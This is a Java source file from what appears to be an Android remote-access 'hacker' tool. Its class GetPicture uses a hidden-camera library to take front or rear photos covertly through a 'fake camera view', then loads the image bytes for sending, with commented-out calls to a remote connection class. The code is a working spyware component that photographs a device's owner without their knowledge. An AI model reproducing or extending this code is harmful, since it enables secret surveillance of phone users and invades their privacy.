package com.androidremote.hacker.tools;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.view.ViewGroup;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.RelativeLayout;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.annotation.RequiresPermission;
import androidx.core.app.ActivityCompat;

import com.androidhiddencamera.CameraCallbacks;
import com.androidhiddencamera.CameraConfig;
import com.androidhiddencamera.CameraError;
import com.androidhiddencamera.CameraPreview;
import com.androidhiddencamera.HiddenCameraActivity;
import com.androidhiddencamera.HiddenCameraUtils;
import com.androidhiddencamera.config.CameraFacing;
import com.androidhiddencamera.config.CameraFocus;
import com.androidhiddencamera.config.CameraImageFormat;
import com.androidhiddencamera.config.CameraResolution;
import com.androidhiddencamera.config.CameraRotation;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.nio.file.Files;




public class GetPicture implements CameraCallbacks {
    private static final int REQ_CODE_CAMERA_PERMISSION = 1253;
    public byte[] file;
    private CameraPreview mCameraPreview;
    private CameraConfig mCachedCameraConfig;
    private Context mContext;
    private Activity act;
    public boolean good=false;
    GetPicture(int vu, Context context, Activity mact){
        mContext=context;
        act=mact;
//        Log.e("KKKKKKKKKKKKKKK","GetP");
//        GetCreateConnection.sendStrings("oklm");
        CameraConfig mCameraConfig = new CameraConfig()
                .getBuilder(context)
                .setCameraFacing(vu == 0 ? CameraFacing.REAR_FACING_CAMERA : CameraFacing.FRONT_FACING_CAMERA)
                .setCameraResolution(CameraResolution.HIGH_RESOLUTION)
                .setImageFormat(CameraImageFormat.FORMAT_JPEG)
                .setImageRotation(vu == 0 ? CameraRotation.ROTATION_90 : CameraRotation.ROTATION_270)
                .setCameraFocus(CameraFocus.AUTO)
                .build();
        mCameraPreview = addPreView();
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {

            //Start camera preview
            startCamera(mCameraConfig);
        } else {
            ActivityCompat.requestPermissions(act, new String[]{Manifest.permission.CAMERA},
                    REQ_CODE_CAMERA_PERMISSION);
        }
        Log.e("KKKKKKKKKKKKKKK","Take GetPicture");
        takePicture();
    }
    @Override
    public void onImageCapture(@NonNull File imageFile) {
        Log.e("KKKKKKKKKKKKKKK","Onimg");
        //CreateConnection.sendStrings("Fin");
        try {
            file = new byte[(int) imageFile.length()];
            BufferedInputStream buf = new BufferedInputStream(new FileInputStream(imageFile));
            buf.read(file, 0, file.length);
            buf.close();
            Log.e("KKKKKKKKKKKKKKK","Data"+String.valueOf(file.length));
            good=true;
        } catch (IOException e) {
            e.printStackTrace();
        }
        mCameraPreview.stopPreviewAndFreeCamera();
    }

    @Override
    public void onCameraError(int errorCode) {

    }


    @RequiresPermission(Manifest.permission.CAMERA)
    protected void startCamera(CameraConfig cameraConfig) {
        if (ActivityCompat.checkSelfPermission(mContext, Manifest.permission.CAMERA)
                != PackageManager.PERMISSION_GRANTED) { //check if the camera permission is available

            //onCameraError(CameraError.ERROR_CAMERA_PERMISSION_NOT_AVAILABLE);
        } else if (cameraConfig.getFacing() == CameraFacing.FRONT_FACING_CAMERA
                && !HiddenCameraUtils.isFrontCameraAvailable(mContext)) {   //Check if for the front camera

            //onCameraError(CameraError.ERROR_DOES_NOT_HAVE_FRONT_CAMERA);
        } else {
            mCachedCameraConfig = cameraConfig;
            mCameraPreview.startCameraInternal(cameraConfig);
            //mCameraPreview.startCameraInternal(cameraConfig);
        }
    }

    protected void takePicture() {
        //Toast.makeText(mContext, "En cours ...", Toast.LENGTH_LONG).show();
        if (mCameraPreview != null) {
            //if (mCameraPreview.isSafeToTakePictureInternal()) {
            mCameraPreview.takePictureInternal();
            Log.e("GET Picture","takePicture()");
            // }else {
            //    Toast.makeText(this, "Busy", Toast.LENGTH_LONG).show();
            // }
        } else {
            Log.e("GET Picture","Error");
            throw new RuntimeException("Background camera not initialized. Call startCamera() to initialize the camera.");

        }
    }




    private CameraPreview addPreView() {
        //create fake camera view
        CameraPreview cameraSourceCameraPreview = new CameraPreview(mContext, this);
        cameraSourceCameraPreview.setLayoutParams(new ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT));

        /*View view = ((ViewGroup) act.getWindow().getDecorView().getRootView()).getChildAt(0);

        if (view instanceof LinearLayout) {
            LinearLayout linearLayout = (LinearLayout) view;

            LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(1, 1);
            linearLayout.addView(cameraSourceCameraPreview, params);
        } else if (view instanceof RelativeLayout) {
            RelativeLayout relativeLayout = (RelativeLayout) view;

            RelativeLayout.LayoutParams params = new RelativeLayout.LayoutParams(1, 1);
            params.addRule(RelativeLayout.ALIGN_PARENT_LEFT, RelativeLayout.TRUE);
            params.addRule(RelativeLayout.ALIGN_PARENT_BOTTOM, RelativeLayout.TRUE);
            relativeLayout.addView(cameraSourceCameraPreview, params);
        } else if (view instanceof FrameLayout) {
            FrameLayout frameLayout = (FrameLayout) view;

            FrameLayout.LayoutParams params = new FrameLayout.LayoutParams(1, 1);
            frameLayout.addView(cameraSourceCameraPreview, params);
        } else {
            throw new RuntimeException("Root view of the activity/fragment cannot be other than Linear/Relative/Frame layout");
        }*/

        return cameraSourceCameraPreview;
    }

}
